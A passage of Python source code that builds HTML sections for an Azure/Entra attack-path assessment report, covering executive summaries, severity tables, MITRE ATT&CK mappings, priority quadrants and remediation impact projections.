        sev_parts.append(f"<strong>{med} medium</strong>")
    sev_phrase = ", ".join(sev_parts) if sev_parts else "no significant"

    top_type = max(by_type.items(), key=lambda x: x[1], default=("unknown", 0))
    top_label = _TYPE_LABELS.get(top_type[0], top_type[0])

    narrative = (
        f'Your environment exposes {sev_phrase} attack path{"s" if total != 1 else ""} '
        f'across <strong>{len(mitre_techs)} MITRE ATT&amp;CK technique{"s" if len(mitre_techs) != 1 else ""}</strong> '
        f'and <strong>{len(by_type)} attack categor{"ies" if len(by_type) != 1 else "y"}</strong>. '
        f'The dominant category is <strong>{_esc(top_label)}</strong> '
        f'({top_type[1]} path{"s" if top_type[1] != 1 else ""}). '
    )

    if crit > 0:
        narrative += (
            f'<span style="color:{_SEVERITY_COLORS["critical"]}">Immediate action is required</span> &mdash; '
            f'critical paths indicate active exploitation risk with a composite score of <strong>{score}/100</strong>.'
        )
    elif high > 0:
        narrative += (
            f'Near-term remediation is recommended for high-severity paths. '
            f'Composite risk score: <strong>{score}/100</strong>.'
        )
    else:
        narrative += f'Overall risk is well-managed with a composite score of <strong>{score}/100</strong>.'

    return f'<div class="exec-narrative">{narrative}</div>'


def _top_attack_paths_table(paths: list[dict]) -> str:
    """Top 5 attack paths summary table in a 5-column grid layout."""
    if not paths:
        return ""
    top = sorted(paths, key=lambda p: -p.get("RiskScore", 0))[:5]
    rows = ""
    for rank, p in enumerate(top, 1):
        sev = p.get("Severity", "informational").lower()
        color = _SEVERITY_COLORS.get(sev, "#6B6B6B")
        ptype = p.get("Type", "unknown")
        label = _TYPE_LABELS.get(ptype, ptype)
        icon = _TYPE_ICONS.get(ptype, "\U0001f4cc")
        chain = p.get("Chain", "")[:120]
        score = p.get("RiskScore", 0)
        alt = " tf-alt" if rank % 2 == 0 else ""
        rows += (
            f'<div class="top-finding-row{alt}">'
            f'<div class="tf-rank">{rank}</div>'
            f'<div class="tf-sev"><span class="badge" style="background:{color};font-size:10px">{_esc(sev.upper())}</span></div>'
            f'<div class="tf-title">{_esc(chain)}</div>'
            f'<div class="tf-cat">{icon} {_esc(label)}</div>'
            f'<div class="tf-count" style="color:{color}">{score}</div>'
            f'</div>'
        )
    return f"""<div class="top-findings-table" style="margin-top:20px">
  <div class="top-finding-header">
    <div>#</div><div>Severity</div><div>Attack Path</div><div>Category</div><div>Score</div>
  </div>
  {rows}
</div>"""


def _priority_quadrant_detail(paths: list[dict]) -> str:
    """Quadrant breakdown table with expandable remediation per quadrant."""
    if len(paths) < 2:
        return ""

    quadrant_map = {"critical": "Critical Action", "high": "Critical Action",
                    "medium": "Quick Wins", "low": "Low Priority", "informational": "Monitor"}
    q_meta = {
        "Critical Action": {"icon": "\U0001f534", "color": "#D13438", "desc": "High risk, high frequency \u2014 address immediately"},
        "Quick Wins": {"icon": "\U0001f7e1", "color": "#FFB900", "desc": "Moderate risk, actionable with targeted fixes"},
        "Low Priority": {"icon": "\U0001f7e2", "color": "#107C10", "desc": "Low risk, monitor during scheduled reviews"},
        "Monitor": {"icon": "\u26aa", "color": "#6B6B6B", "desc": "Informational findings, baseline tracking"},
    }

    by_quadrant: dict[str, list[dict]] = {}
    for p in paths:
        sev = p.get("Severity", "informational").lower()
        quad = quadrant_map.get(sev, "Monitor")
        by_quadrant.setdefault(quad, []).append(p)

    # Summary table
    rows = ""
    for quad in ["Critical Action", "Quick Wins", "Low Priority", "Monitor"]:
        q_paths = by_quadrant.get(quad, [])
        if not q_paths:
            continue
        meta = q_meta[quad]
        sev_dist = Counter(p.get("Severity", "informational").lower() for p in q_paths)
        sev_pills = " ".join(
            f'<span class="badge" style="background:{_SEVERITY_COLORS.get(s, "#6B6B6B")};font-size:9px;padding:1px 6px">{c}</span>'
            for s, c in sorted(sev_dist.items(), key=lambda x: _SEVERITY_ORDER.get(x[0], 4))
        )
        rows += (
            f'<tr>'
            f'<td style="padding:8px 12px"><span style="color:{meta["color"]}">{meta["icon"]} {_esc(quad)}</span></td>'
            f'<td style="text-align:center;padding:8px 12px;font-family:var(--font-mono)">{len(q_paths)}</td>'
            f'<td style="padding:8px 12px">{sev_pills}</td>'
            f'<td style="padding:8px 12px;font-size:12px;color:var(--text-secondary)">{_esc(meta["desc"])}</td>'
            f'</tr>'
        )

    # Expandable detail per quadrant
    detail_sections = ""
    for quad in ["Critical Action", "Quick Wins", "Low Priority", "Monitor"]:
        q_paths = by_quadrant.get(quad, [])
        if not q_paths:
            continue
        meta = q_meta[quad]
        path_rows = ""
        for idx, p in enumerate(sorted(q_paths, key=lambda x: -x.get("RiskScore", 0)), start=1):
            sev = p.get("Severity", "informational").lower()
            color = _SEVERITY_COLORS.get(sev, "#6B6B6B")
            # FULL content — no truncation. Wrap long strings via CSS.
            chain_full = p.get("Chain", "") or p.get("Description", "") or "(no description)"
            rem_full   = p.get("Remediation", "") or "(no remediation guidance)"
            ptype      = p.get("Type", "") or ""
            resource   = p.get("Resource") or p.get("ResourceName") or p.get("TargetResource") or "—"
            mitre      = p.get("MitreTechnique", "") or ""
            score      = p.get("RiskScore", 0)
            # Zebra-stripe rows for readability
            row_bg = "background:rgba(0,0,0,.015)" if idx % 2 == 0 else ""
            path_rows += (
                f'<tr style="border-bottom:1px solid var(--border);vertical-align:top;{row_bg}">'
                f'<td style="padding:10px 10px;text-align:center;font-family:var(--font-mono);font-size:11px;color:var(--text-muted);width:38px">{idx}</td>'
                f'<td style="padding:10px 10px;width:60px"><span class="badge" style="background:{color};font-size:9px;white-space:nowrap">{_esc(sev.upper())}</span></td>'
                f'<td style="padding:10px 10px;text-align:center;font-family:var(--font-mono);font-size:12px;font-weight:700;color:{color};width:55px">{score}</td>'
                f'<td style="padding:10px 10px;font-size:12px;line-height:1.5;word-break:break-word;overflow-wrap:anywhere;max-width:340px">'
                f'<div style="font-weight:600;color:var(--text);margin-bottom:3px">{_esc(chain_full)}</div>'
                + (f'<div style="font-size:10.5px;color:var(--text-muted)"><span style="display:inline-block;padding:1px 6px;background:var(--bg-card);border-radius:3px;margin-right:4px">{_esc(ptype)}</span>'
                   + (f'<span style="margin-right:6px">🎯 <code style="font-size:10px">{_esc(mitre)}</code></span>' if mitre else "")
                   + (f'<span>📦 {_esc(str(resource))}</span>' if resource and str(resource) != "—" else "")
                   + '</div>' if (ptype or mitre or (resource and str(resource) != "—")) else "")
                + f'</td>'
                f'<td style="padding:10px 10px;font-size:11.5px;line-height:1.55;color:var(--text-secondary);word-break:break-word;overflow-wrap:anywhere;max-width:420px">{_esc(rem_full)}</td>'
                f'</tr>'
            )
        detail_sections += (
            f'<div style="margin-top:18px">'
            f'<h5 style="margin:0 0 10px;font-size:13px;color:{meta["color"]}">{meta["icon"]} {_esc(quad)} ({len(q_paths)} paths) — full details</h5>'
            f'<div style="overflow-x:auto;border:1px solid var(--border);border-radius:6px">'
            f'<table style="width:100%;border-collapse:collapse;font-size:12px;table-layout:fixed">'
            f'<colgroup>'
            f'<col style="width:38px"><col style="width:60px"><col style="width:55px"><col style="width:42%"><col style="width:auto">'
            f'</colgroup>'
            f'<thead><tr style="border-bottom:2px solid var(--border);background:var(--bg-card)">'
            f'<th style="text-align:center;padding:8px 10px;font-size:10px;text-transform:uppercase;color:var(--text-muted)">#</th>'
            f'<th style="text-align:left;padding:8px 10px;font-size:10px;text-transform:uppercase;color:var(--text-muted)">Sev</th>'
            f'<th style="text-align:center;padding:8px 10px;font-size:10px;text-transform:uppercase;color:var(--text-muted)">Score</th>'
            f'<th style="text-align:left;padding:8px 10px;font-size:10px;text-transform:uppercase;color:var(--text-muted)">Attack Path &amp; Context</th>'
            f'<th style="text-align:left;padding:8px 10px;font-size:10px;text-transform:uppercase;color:var(--text-muted)">Recommended Remediation (full text)</th>'
            f'</tr></thead><tbody>{path_rows}</tbody></table></div></div>'
        )

    return f"""
<div style="margin-top:24px">
  <h4 style="margin-bottom:12px">Quadrant Breakdown</h4>
  <div style="overflow-x:auto">
    <table class="data-table">
      <thead><tr>
        <th>Quadrant</th><th style="text-align:center">Paths</th><th>Severity Distribution</th><th>Description</th>
      </tr></thead>
      <tbody>{rows}</tbody>
    </table>
  </div>
  <details open style="margin-top:16px">
    <summary style="cursor:pointer;font-size:14px;font-weight:700;color:var(--text)">
      Remediation Action Plan by Quadrant — full details (no truncation)
    </summary>
    {detail_sections}
  </details>
</div>"""


# ── Section Generators ──────────────────────────────────────────────────


def _section_explainer(title: str, content: str) -> str:
    """Generate a contextual 'How to Read' explanation box for a report section."""
    return (
        f'<div class="section-explainer">'
        f'<div class="section-explainer-icon">ℹ️</div>'
        f'<div class="section-explainer-body">'
        f'<h4 class="section-explainer-title">{title}</h4>{content}'
        f'</div></div>'
    )


def _exploitation_analysis(path: dict) -> str:
    """Generate technical security assessment analysis for a finding card."""
    ptype = path.get("Type", "unknown")
    sev = path.get("Severity", "informational").lower()
    score = path.get("RiskScore", 0)
    chain_text = path.get("Chain", "")
    chain_nodes = path.get("ChainNodes", [])
    mitre = path.get("MitreTechnique", "")
    mitre_tactic = path.get("MitreTactic", "")

    # 1. Attack narrative from chain nodes
    steps_html = ""
    if chain_nodes:
        for i, node in enumerate(chain_nodes):
            ntype = node.get("type", "action")
            label = node.get("label", "Unknown")
            desc = _STEP_DESCRIPTIONS.get(ntype, _STEP_DESCRIPTIONS["action"])
            steps_html += (
                f'<div class="ea-step"><span class="ea-step-num">{i + 1}</span>'
                f'<div><strong>{_esc(label)}</strong><br>'
                f'<span class="ea-step-desc">{_esc(desc["desc"])}</span></div></div>'
            )
    elif chain_text:
        parts = [p.strip() for p in chain_text.split("\u2192") if p.strip()]
        for i, part in enumerate(parts):
            steps_html += (
                f'<div class="ea-step"><span class="ea-step-num">{i + 1}</span>'
                f'<div><strong>{_esc(part)}</strong></div></div>'
            )

    # 2. Prerequisites
    prereqs = _PREREQS.get(ptype, "Valid authentication to the Azure/Entra tenant with at least read-level permissions.")

    # 3. Exploitability rating
    chain_len = len(chain_nodes) if chain_nodes else len([p for p in chain_text.split("\u2192") if p.strip()])
    if score >= 80:
        exploit_label, exploit_color = "HIGH", "#D13438"
        exploit_desc = "This path requires minimal attacker sophistication and can be exploited with standard tools and publicly available techniques."
    elif score >= 60:
        exploit_label, exploit_color = "MODERATE", "#FF8C00"
        exploit_desc = "This path requires intermediate skill and may involve multiple coordinated steps to exploit successfully."
    elif score >= 40:
        exploit_label, exploit_color = "LOW", "#FFB900"
        exploit_desc = "This path requires significant effort, specific preconditions, or insider knowledge to exploit."
    else:
        exploit_label, exploit_color = "MINIMAL", "#107C10"
        exploit_desc = "This path has limited exploitability under normal operating conditions."

    complexity = f"{chain_len}-step attack chain" if chain_len else "Unknown complexity"

    # 4. Business impact
    impact = _IMPACT_MAP.get(ptype, "Potential unauthorized access to Azure resources and data.")

    # 5. Detection indicators
    indicators = _DETECTION_MAP.get(ptype, ["Monitor Azure AD audit logs for unusual activity"])
    indicators_html = "".join(f'<li>{_esc(ind)}</li>' for ind in indicators[:4])

    # 6. MITRE context
    mitre_html = ""
    if mitre:
        mitre_url = f"https://attack.mitre.org/techniques/{mitre.replace('.', '/')}/"
        mitre_html = (
            f'<div class="ea-mitre"><strong>MITRE ATT&amp;CK:</strong> '
            f'<a href="{mitre_url}" target="_blank" rel="noopener" style="color:var(--primary)">{_esc(mitre)}</a>'
            f' &mdash; {_esc(mitre_tactic)}</div>'
        )

    return f"""<details class="exploitation-analysis">
  <summary>\U0001f50d Security Assessment Analysis</summary>
  <div class="ea-content">
    {mitre_html}
    <div class="ea-section">
      <h5>Exploitation Walkthrough</h5>
      <div class="ea-steps">{steps_html}</div>
    </div>
    <div class="ea-grid">
      <div class="ea-card">
        <h6>Prerequisites &amp; Entry Point</h6>
        <p>{_esc(prereqs)}</p>
      </div>
      <div class="ea-card">
        <h6>Exploitability: <span style="color:{exploit_color}">{exploit_label}</span></h6>
        <p>{_esc(exploit_desc)}</p>
        <p class="ea-meta">Complexity: {_esc(complexity)}</p>
      </div>
      <div class="ea-card">
        <h6>Business Impact</h6>
        <p>{_esc(impact)}</p>
      </div>
      <div class="ea-card">
        <h6>Detection Indicators</h6>
        <ul class="ea-indicators">{indicators_html}</ul>
      </div>
    </div>
  </div>
</details>"""


def _attack_surface_narrative(summary: dict, paths: list[dict]) -> str:
    """Generate a technical attack surface summary for the executive section."""
    total = summary.get("TotalPaths", 0)
    counts = summary.get("SeverityCounts", {})
    by_type = summary.get("PathsByType", {})
    mitre_techs = summary.get("MitreTechniques", [])
    crit = counts.get("critical", 0)
    high = counts.get("high", 0)

    # Find the most dangerous path
    worst_chain = worst_type = ""
    worst_score = 0
    if paths:
        worst = max(paths, key=lambda p: p.get("RiskScore", 0))
        worst_chain = worst.get("Chain", "")[:120]
        worst_type = _TYPE_LABELS.get(worst.get("Type", ""), worst.get("Type", ""))
        worst_score = worst.get("RiskScore", 0)

    # Count unique resource types and principals
    resource_types = set(p.get("ResourceType", "") for p in paths if p.get("ResourceType"))
    principals = set(p.get("PrincipalName", "") for p in paths if p.get("PrincipalName"))

    paragraphs = []

    # Overall assessment
    if crit > 0:
        paragraphs.append(
            f"<strong>Overall Assessment: CRITICAL EXPOSURE.</strong> "
            f"The assessment identified {total} distinct attack paths, of which {crit} are rated critical. "
            f"These paths represent realistic, exploitable routes that an adversary with initial tenant access "
            f"could leverage to reach high-value targets. The combination of {len(by_type)} attack categories "
            f"across {len(mitre_techs)} MITRE ATT&amp;CK techniques indicates a broad attack surface."
        )
    elif high > 0:
        paragraphs.append(
            f"<strong>Overall Assessment: ELEVATED RISK.</strong> "
            f"The assessment discovered {total} attack paths with {high} rated high-severity. "
            f"While no critical paths were detected, the high-severity findings represent significant exposure "
            f"that could be exploited by a motivated adversary."
        )
    else:
        paragraphs.append(
            f"<strong>Overall Assessment: MODERATE EXPOSURE.</strong> "
            f"The assessment found {total} attack paths. No critical or high-severity paths were detected, "
            f"indicating that the environment has reasonable security controls in place."
        )

    # Most dangerous path
    if worst_chain:
        paragraphs.append(
            f"<strong>Highest-Risk Path:</strong> {_esc(worst_type)} (Score: {worst_score}/100) &mdash; "
            f"<em>{_esc(worst_chain)}</em>"
        )

    # Affected scope
    scope_parts = []
    if principals:
        scope_parts.append(f"{len(principals)} unique identit{'ies' if len(principals) != 1 else 'y'}")
    if resource_types:
        scope_parts.append(f"{len(resource_types)} resource type{'s' if len(resource_types) != 1 else ''}")
    if scope_parts:
        paragraphs.append(
            f"<strong>Affected Scope:</strong> Attack paths involve {' and '.join(scope_parts)}, "
            f"spanning {len(by_type)} distinct attack categories."
        )

    content = "".join(f"<p>{p}</p>" for p in paragraphs)
    return f'<div class="attack-surface-summary"><h4>\U0001f3af Attack Surface Assessment</h4>{content}</div>'


def _doc_control_section(assessment: dict) -> str:
    """Document control and audit attestation."""
    tenant = assessment.get("TenantId", "unknown")
    ts = assessment.get("AssessmentTimestamp", "")
    paths = assessment.get("Paths", [])
    ev_types = assessment.get("EvidenceTypes", {})

    # Compute SHA-256 of assessment data for audit trail
    raw = json.dumps(assessment, sort_keys=True, default=str)
    sha = hashlib.sha256(raw.encode()).hexdigest()[:16]
    report_id = f"AP-{sha.upper()}"
    total_evidence = sum(ev_types.values())

    return f"""
<section class="section" id="doc-control">
  <h2>Document Control</h2>
  {_section_explainer('How to Read This Section',
    '<p>This section provides the report\'s audit trail and metadata. The <strong>Report ID</strong> is a unique hash '
    'derived from the raw assessment data &mdash; use it to reference this exact report in security correspondence or audit logs.</p>'
    '<p><strong>Classification</strong> indicates document handling requirements. <strong>Collection Method</strong> describes '
    'the APIs and authentication used to gather evidence. The <strong>Audit Attestation</strong> below provides data integrity verification.</p>'
  )}
  <table class="doc-control-table">
    <tr><th data-tip="Unique identifier for this assessment run, derived from a SHA-256 hash of the raw data. Use this ID when referencing this specific report in correspondence or audit logs.">Report ID</th><td><code>{_esc(report_id)}</code></td></tr>
    <tr><th data-tip="Microsoft Entra (Azure AD) tenant identifier that was evaluated. All data in this report is scoped to this single tenant.">Tenant ID</th><td><code>{_esc(tenant)}</code></td></tr>
    <tr><th data-tip="UTC timestamp when the assessment data was collected. The report was rendered shortly after collection completed.">Generated</th><td>{_esc(ts[:19] if ts else "N/A")}</td></tr>
    <tr><th data-tip="Document handling classification. CONFIDENTIAL means this report must not be shared outside the authorized security team.">Classification</th><td>CONFIDENTIAL — Internal Use Only</td></tr>
    <tr><th data-tip="Software tool and version that produced this assessment.">Tool</th><td>EnterpriseSecurityIQ Attack Path Detection v{VERSION}</td></tr>
    <tr><th data-tip="APIs used to gather raw evidence. DefaultAzureCredential supports managed identity, CLI, and service principal authentication.">Collection Method</th><td>Azure Resource Graph + Microsoft Graph API (DefaultAzureCredential)</td></tr>
  </table>
  <div class="conf-notice">
    <strong>⚠ Confidentiality Notice:</strong> This report contains security-sensitive information
    about attack paths and vulnerabilities in your Azure/Entra environment. Distribution must be
    restricted to authorized security personnel only.
  </div>
  <div class="how-to-read">
    <h4>Audit Attestation</h4>
    <p><strong>Assessment Scope:</strong> All Azure subscriptions and Entra ID configurations accessible to the authenticated principal.</p>
    <p><strong>Data Integrity:</strong> {total_evidence} evidence records collected across {len([k for k, v in ev_types.items() if v > 0])} evidence types.</p>
    <p><strong>Evidence Hash (SHA-256):</strong> <code>{sha}</code></p>
    <p><strong>Attack Paths Detected:</strong> {len(paths)}</p>
  </div>
</section>"""


def _executive_summary_section(summary: dict, paths: list[dict]) -> str:
    """Executive summary with narrative and KPI cards."""
    score = summary.get("OverallRiskScore", 0)
    total = summary.get("TotalPaths", 0)
    counts = summary.get("SeverityCounts", {})
    mitre_count = len(summary.get("MitreTechniques", []))
    by_type = summary.get("PathsByType", {})

    # Posture narrative
    if score >= 80:
        posture = "Your environment has <strong>critical attack paths</strong> that require immediate remediation. Active exploitation risk is high."
        posture_class = "posture-critical"
    elif score >= 60:
        posture = "Significant attack paths exist that should be addressed in the <strong>near term</strong>. Prioritize critical and high-severity findings."
        posture_class = "posture-high"
    elif score >= 40:
        posture = "Moderate attack surface detected. <strong>Targeted remediation</strong> of high-priority paths is recommended."
        posture_class = "posture-medium"
    else:
        posture = "Attack surface is <strong>well-managed</strong> with limited exploitable paths. Continue monitoring and periodic assessment."
        posture_class = "posture-low"

    type_count = len(by_type)
    crit = counts.get("critical", 0)
    high = counts.get("high", 0)

    # Level badge (matching data-security style)
    if score >= 80:
        level_text, level_color = "Critical Risk", "#D13438"
    elif score >= 60:
        level_text, level_color = "High Risk", "#E74856"
    elif score >= 40:
        level_text, level_color = "Medium Risk", "#FFB900"
    elif score >= 20:
        level_text, level_color = "Low Risk", "#107C10"
    else:
        level_text, level_color = "Minimal Risk", "#36B37E"

    return f"""
<section class="section" id="exec-summary">
  <h2>Executive Summary</h2>
  {_section_explainer('How to Read This Section',
    '<p>The <strong>Risk Score</strong> (0&ndash;100) represents the worst-case exploitability across all detected paths &mdash; '
    'not an average. Higher scores indicate that an adversary could traverse one or more paths to reach high-value targets.</p>'
    '<p><strong>Severity Levels:</strong> Critical (&ge;80) = immediate action, High (60&ndash;79) = near-term remediation, '
    'Medium (40&ndash;59) = scheduled fix, Low (&lt;40) = monitor. The <strong>stat cards</strong> below show key metrics '
    'with hover tooltips for tenant-specific context.</p>'
  )}
  <div class="posture-banner {posture_class}">{posture}</div>
  {_natural_language_summary(summary, paths)}
  {_attack_surface_narrative(summary, paths)}
  <div class="exec-grid">
    <div class="exec-panel">
      <h3>Security Score</h3>
      <div class="score-display" style="justify-content:center">
        <div class="score-ring-wrap" data-tip="Risk Score: {score}/100&#10;Higher scores indicate greater attack surface exposure.&#10;&#10;YOUR TENANT:&#10;{crit} critical + {high} high-severity paths detected.">{_ring_score_svg(score)}</div>
      </div>
      <div class="score-info" style="text-align:center;margin-top:12px">
        <span class="level-badge" style="background:{level_color};color:#fff">{level_text}</span>
        <span style="font-size:12px;color:var(--text-muted);margin-top:6px">{total} attack paths discovered &middot; {crit + high} require action</span>
      </div>
    </div>
    <div class="exec-panel">
      <h3>Severity Distribution</h3>
      {_donut_svg(counts)}
      <div class="donut-legend">
        {"".join(f'<span class="legend-item"><span class="dot" style="background:{_SEVERITY_COLORS[s]}"></span>{s.capitalize()}: {counts.get(s,0)}</span>' for s in ("critical","high","medium","low","informational") if counts.get(s,0))}
      </div>
    </div>
  </div>
  <div class="stat-grid">
    <div class="stat-card" data-tip="Total distinct attack paths discovered across all evaluators.&#10;&#10;YOUR TENANT:&#10;{total} paths identified across {type_count} categories."><div class="stat-value">{total}</div><div class="stat-label">Total Paths</div></div>
    <div class="stat-card" data-tip="Critical paths require immediate remediation.&#10;Active exploitation risk is high.&#10;&#10;YOUR TENANT:&#10;{crit} critical path(s) found."><div class="stat-value" style="color:{_SEVERITY_COLORS['critical']}">{crit}</div><div class="stat-label">Critical</div></div>
    <div class="stat-card" data-tip="High-severity paths should be addressed in the near term.&#10;&#10;YOUR TENANT:&#10;{high} high-severity path(s) found."><div class="stat-value" style="color:{_SEVERITY_COLORS['high']}">{high}</div><div class="stat-label">High</div></div>
    <div class="stat-card" data-tip="Medium-severity paths warrant scheduled remediation.&#10;&#10;YOUR TENANT:&#10;{counts.get('medium',0)} medium-severity path(s) found."><div class="stat-value" style="color:{_SEVERITY_COLORS['medium']}">{counts.get('medium',0)}</div><div class="stat-label">Medium</div></div>
    <div class="stat-card" data-tip="Low-severity paths for monitoring during periodic reviews.&#10;&#10;YOUR TENANT:&#10;{counts.get('low',0)} low-severity path(s) found."><div class="stat-value" style="color:{_SEVERITY_COLORS['low']}">{counts.get('low',0)}</div><div class="stat-label">Low</div></div>
    <div class="stat-card" data-tip="Distinct MITRE ATT&amp;CK techniques mapped across all attack paths.&#10;&#10;YOUR TENANT:&#10;{mitre_count} unique techniques detected across paths."><div class="stat-value">{mitre_count}</div><div class="stat-label">MITRE Techniques</div></div>
    <div class="stat-card" data-tip="Categories of attack paths (e.g. privilege escalation, lateral movement).&#10;&#10;YOUR TENANT:&#10;{type_count} distinct categories identified."><div class="stat-value">{type_count}</div><div class="stat-label">Attack Categories</div></div>
    <div class="stat-card" data-tip="Paths rated critical or high that require active remediation.&#10;&#10;YOUR TENANT:&#10;{crit + high} path(s) need immediate or near-term action."><div class="stat-value">{crit + high}</div><div class="stat-label">Action Required</div></div>
  </div>
  <div class="exec-grid" style="margin-top:4px">
    <div class="exec-panel" style="grid-column:span 2">
      <h3>Severity Breakdown</h3>
      {_severity_bars_svg(counts)}
    </div>
  </div>
  {_stacked_bar_svg(counts)}
  {_top_attack_paths_table(paths)}
</section>"""


def _category_cards_section(paths: list[dict]) -> str:
    """Grid of category cards with icons and severity breakdown."""
    by_type: dict[str, list[dict]] = {}
    for p in paths:
        by_type.setdefault(p.get("Type", "unknown"), []).append(p)

    if not by_type:
        return ""

    cards = []
    for ptype in sorted(by_type.keys(), key=lambda t: -max(p.get("RiskScore", 0) for p in by_type[t])):
        group = by_type[ptype]
        icon = _TYPE_ICONS.get(ptype, "📌")
        label = _TYPE_LABELS.get(ptype, ptype)
        max_score = max(p.get("RiskScore", 0) for p in group)
        max_sev = min(group, key=lambda p: _SEVERITY_ORDER.get(p.get("Severity", "informational").lower(), 4))
        sev = max_sev.get("Severity", "informational").lower()
        color = _SEVERITY_COLORS.get(sev, "#6B6B6B")
        sev_counts = Counter(p.get("Severity", "informational").lower() for p in group)
        sev_pills = " ".join(
            f'<span class="cat-pill" style="background:{_SEVERITY_COLORS.get(s, "#6B6B6B")}">{c}</span>'
            for s, c in sorted(sev_counts.items(), key=lambda x: _SEVERITY_ORDER.get(x[0], 4))
        )

        # Level text for category card
        if max_score >= 80:
            level_txt, level_clr = "Critical", "#D13438"
        elif max_score >= 60:
            level_txt, level_clr = "High", "#E74856"
        elif max_score >= 40:
            level_txt, level_clr = "Medium", "#FFB900"
        else:
            level_txt, level_clr = "Low", "#107C10"

        cards.append(f"""
<a href="#type-{_esc(ptype)}" class="category-card" style="border-top:3px solid {color};text-decoration:none">
  <div class="category-icon">{icon}</div>
  <div class="category-name">{_esc(label)}</div>
  <div class="category-score" style="color:{color}">{len(group)}</div>
  <div class="category-level" style="color:{level_clr}">{level_txt}</div>
  <div class="category-findings">{sev_pills}</div>
</a>""")

    return f"""
<section class="section" id="categories">
  <h2>Attack Path Categories</h2>
  {_section_explainer('How to Read This Section',
    '<p>Each card represents a distinct class of attack path detected in your environment. '
    'The <strong>number</strong> indicates how many paths were found in that category. '
    'The <strong>severity color</strong> on top reflects the worst-case finding within that category.</p>'
    '<p>Click any card to jump directly to its detailed findings. Categories are sorted by risk &mdash; '
    'the most dangerous category appears first.</p>'
  )}
  <div class="category-grid">{"".join(cards)}</div>
</section>"""


def _mitre_heatmap_section(paths: list[dict]) -> str:
    """MITRE ATT&CK heatmap + technique table."""
    tech_map: dict[str, dict] = {}
    for p in paths:
        t = p.get("MitreTechnique", "")
        if t:
            if t not in tech_map:
                tech_map[t] = {"technique": t, "tactic": p.get("MitreTactic", ""), "count": 0, "max_score": 0, "max_sev": "informational"}
            tech_map[t]["count"] += 1
            if p.get("RiskScore", 0) > tech_map[t]["max_score"]:
                tech_map[t]["max_score"] = p.get("RiskScore", 0)
                tech_map[t]["max_sev"] = p.get("Severity", "informational").lower()

    if not tech_map:
        return ""

    rows = ""
    for t in sorted(tech_map.values(), key=lambda x: -x["max_score"]):
        url = f"https://attack.mitre.org/techniques/{t['technique'].replace('.', '/')}/"
        badge_color = _SEVERITY_COLORS.get(t["max_sev"], "#6B6B6B")
        rows += f"""<tr>
  <td><a href="{url}" target="_blank" rel="noopener" class="mitre-link">{_esc(t['technique'])}</a></td>
  <td>{_esc(t['tactic'])}</td>
  <td style="text-align:center">{t['count']}</td>
  <td style="text-align:center"><span class="badge" style="background:{badge_color}">{t['max_score']}</span></td>
</tr>"""

    return f"""
<section class="section" id="mitre">
  <h2>MITRE ATT&CK Coverage</h2>
  {_section_explainer('How to Read This Section',
    '<p>This matrix maps detected attack paths to the <strong>MITRE ATT&amp;CK framework</strong> &mdash; the industry '
    'standard for categorizing adversary behavior. <strong>Rows</strong> are specific techniques (e.g., T1078.004 = '
    'Cloud Account exploitation). <strong>Columns</strong> are tactical phases (e.g., Persistence, Credential Access).</p>'
    '<p><strong>Cell color</strong> indicates severity and the <strong>number</strong> shows how many attack paths use '
    'that technique. Use the table below the heatmap for clickable links to the official MITRE ATT&amp;CK documentation.</p>'
  )}
  <div class="heatmap-container" style="overflow-x:auto;margin-bottom:24px">{_heatmap_svg(paths)}</div>
  <table class="data-table">
    <thead><tr><th>Technique</th><th>Tactic</th><th style="text-align:center">Paths</th><th style="text-align:center">Max Score</th></tr></thead>
    <tbody>{rows}</tbody>
  </table>
</section>"""


def _priority_quadrant_section(paths: list[dict]) -> str:
    """Priority quadrant visualization with detail breakdown."""
    if len(paths) < 2:
        return ""
    return f"""
<section class="section" id="priority">
  <h2>Priority Quadrant</h2>
  {_section_explainer('How to Read This Section',
    '<p>This quadrant chart helps you <strong>prioritize remediation</strong> by mapping each attack path category '
    'on two axes: <strong>Frequency</strong> (X-axis, how many paths) and <strong>Risk Score</strong> (Y-axis, how dangerous).</p>'
    '<p><strong>Top-right (Critical Action):</strong> High frequency + high risk &mdash; address immediately. '
    '<strong>Top-left (Monitor):</strong> Low frequency + high risk &mdash; watch closely. '
    '<strong>Bottom-right (Quick Wins):</strong> High frequency + low risk &mdash; easy fixes. '
    '<strong>Bottom-left (Low Priority):</strong> Low frequency + low risk &mdash; schedule for later. '
    'Bubble size indicates the number of paths in each category.</p>'
  )}
  <div style="overflow-x:auto">{_priority_quadrant_svg(paths)}</div>
  {_priority_quadrant_detail(paths)}
</section>"""


def _remediation_impact_section(paths: list[dict], score: int) -> str:
    """Projected score improvements if paths are remediated."""
    if not paths:
        return ""
    crit_paths = [p for p in paths if p.get("Severity", "").lower() == "critical"]
    high_paths = [p for p in paths if p.get("Severity", "").lower() == "high"]

    crit_reduction = len(crit_paths) * 8
    high_reduction = len(high_paths) * 4
    score_if_crit = max(0, score - crit_reduction)
    score_if_crit_high = max(0, score - crit_reduction - high_reduction)
    all_addressable = [p for p in paths if p.get("Severity", "").lower() in ("critical", "high", "medium")]
    med_paths = [p for p in paths if p.get("Severity", "").lower() == "medium"]
    med_reduction = len(med_paths) * 2
    score_if_all = max(0, score - crit_reduction - high_reduction - med_reduction)

    delta_crit = score - score_if_crit
    delta_crit_high = score - score_if_crit_high
    delta_all = score - score_if_all

    return f"""
<section class="section" id="remediation-impact">
  <h2>Remediation Impact</h2>
  {_section_explainer('How to Read This Section',
    '<p>This section projects how your <strong>risk score would change</strong> if you remediate different severity tiers. '
    'Each card shows the projected score and the point reduction (&blacktriangledown;).</p>'
    '<p>Use this to build a <strong>business case for remediation investment</strong>: addressing all Critical paths first '
    'delivers the highest score reduction per effort. The rightmost card shows the best achievable score if all '
    'addressable (Critical + High + Medium) paths are remediated.</p>'
  )}
  <div class="stat-grid" style="grid-template-columns:repeat(4,1fr)">
    <div class="stat-card">
      <div class="stat-value" style="color:{_SEVERITY_COLORS.get('critical')}">{score}</div>
      <div class="stat-label">Current Score</div>
    </div>
    <div class="stat-card">
      <div class="stat-value" style="color:{_SEVERITY_COLORS.get('high')}">{score_if_crit}</div>
      <div class="stat-label">If Critical Fixed ({len(crit_paths)} paths)</div>
      <div style="font-size:11px;color:#107C10;margin-top:4px">▼ {delta_crit} pts</div>
    </div>
    <div class="stat-card">
      <div class="stat-value" style="color:#FFB900">{score_if_crit_high}</div>
      <div class="stat-label">If Critical+High Fixed ({len(crit_paths) + len(high_paths)} paths)</div>
      <div style="font-size:11px;color:#107C10;margin-top:4px">▼ {delta_crit_high} pts</div>
    </div>
    <div class="stat-card">
      <div class="stat-value" style="color:#107C10">{score_if_all}</div>
